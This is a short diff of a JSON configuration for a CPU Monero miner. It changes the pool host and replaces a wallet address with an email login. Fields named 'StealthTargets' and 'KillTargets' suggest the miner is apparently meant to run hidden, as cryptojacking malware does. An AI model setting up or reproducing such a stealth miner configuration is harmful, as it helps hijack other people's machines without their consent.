@@ -1,8 +1,8 @@
 {
 	"CPU":
 		{
-    		"Pool": "xmr-eu1.nanopool.org:14433",
-    		"Wallet/User": "46f7NjFY7YLQnbHNq5332wYFf7rT3KGpt3jAS5WmeJDqjTuqS3bFx5t8TeodGXqsYidpoukpVpbXvKHSfPcz2gdGMsuFhXY",
+    		"Pool": "xmr.pool.minergate.com:45700",
+    		"Wallet/User": "xdxd13121@gmail.com",
     		"Password": "",
     		"StealthTargets": "",
 			"KillTargets": "",
